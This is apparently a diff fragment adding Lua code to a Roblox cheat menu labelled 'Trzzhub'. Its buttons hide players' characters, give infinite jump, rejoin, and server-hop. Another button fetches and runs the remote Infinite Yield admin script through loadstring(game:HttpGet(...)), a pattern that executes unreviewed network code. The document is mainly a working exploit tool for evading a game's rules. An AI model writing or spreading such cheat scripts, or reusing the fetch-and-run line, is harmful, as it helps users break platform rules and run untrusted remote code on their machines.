+char.Parent = nil
+end
+
+-- Sembunyikan karakter saat ini
+hideChar(player.Character)
+
+-- Saat respawn (CharacterAdded), langsung sembunyikan lagi
+player.CharacterAdded:Connect(function(char)
+task.wait(0.5) -- biar sempat load dulu
+hideChar(char)
+end)
+end
+
+-- Sembunyikan semua player yang sudah ada
+for _, player in ipairs(Players:GetPlayers()) do
+fullyHidePlayer(player)
+end
+
+-- Sembunyikan player baru yang join
+Players.PlayerAdded:Connect(function(player)
+player.CharacterAdded:Connect(function(char)
+task.wait(0.5)
+char.Parent = nil
+end)
+end)
+end
+})
+
+ScriptTab:Button({
+Title = "INFINITE YIELD",
+Desc = "Admin command script",
+Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+end
+})
+
+
+---------------------------------------------------
+-- INF JUMP (dibuat manual agar tidak perlu eksternal link)
+---------------------------------------------------
+ScriptTab:Button({
+Title = "INF JUMP",
+Desc = "Infinite jump",
+Callback = function()
+local gui = Instance.new("ScreenGui")
+gui.Name = "InfJumpGUI"
+gui.ResetOnSpawn = false
+gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 200, 0, 80)
+frame.Position = UDim2.new(0, 100, 0, 100)
+frame.BackgroundTransparency = 0.3
+frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+frame.Active = true
+frame.Draggable = true
+frame.Parent = gui
+
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, 0, 0, 25)
+label.BackgroundTransparency = 1
+label.Font = Enum.Font.SourceSansBold
+label.TextColor3 = Color3.new(1, 1, 1)
+label.TextSize = 16
+label.Text = "INF JUMP (By Trzzhub)"
+label.Parent = frame
+
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0.8, 0, 0, 30)
+button.Position = UDim2.new(0.1, 0, 0.5, 0)
+button.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+button.Text = "Enable Inf Jump"
+button.Font = Enum.Font.SourceSans
+button.TextColor3 = Color3.new(1, 1, 1)
+button.TextSize = 14
+button.Parent = frame
+
+local enabled = false
+button.MouseButton1Click:Connect(function()
+enabled = not enabled
+button.Text = enabled and "Disable Inf Jump" or "Enable Inf Jump"
+end)
+
+game:GetService("UserInputService").JumpRequest:Connect(function()
+if enabled then
+local humanoid = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+if humanoid then
+humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+end
+end
+end)
+end
+})
+
+
+ScriptTab:Button({
+Title = "REJOIN GAME",
+Desc = "Rejoin",
+Callback = function()
+game:GetService("TeleportService"):Teleport(game.PlaceId)
+end
+})
+
+ScriptTab:Button({
+Title = "SERVER HOP",
+Desc = "Teleports you to a random",
+Callback = function()
+local TS = game:GetService("TeleportService")
+local players = game:GetService("Players")
+local player = players.LocalPlayer
+local currentPlaceId = game.PlaceId
+local currentJobId = game.JobId
+
+local function getOtherServers()
+local servers = {}
+local pages = TS:GetPlayerCountPages(currentPlaceId)
+while true do
+for _, server in ipairs(pages:GetCurrentPage()) do
+if server.id ~= currentJobId and server.playing < server.maxPlayers then
+table.insert(servers, server.id)
+end
+end
+if pages.IsFinished then
+break
+else
+pages:AdvanceToNextPageAsync()
+end
+end
+return servers
+end
+
+local servers = getOtherServers()
+if #servers > 0 then
+local chosenServer = servers[math.random(1, #servers)]
+TS:TeleportToPlaceInstance(currentPlaceId, chosenServer, player)
+print("Success: Server hopped!")
+else
+print("Server Hop Failed: No other available servers found.")
+end
+end
+})
+
+
+-- Pastikan Window dan WindUI sudah ada
+local Tab = Window:Tab({
+Title = "SETTING",
+Icon = "cog",
+Locked = false,
+})
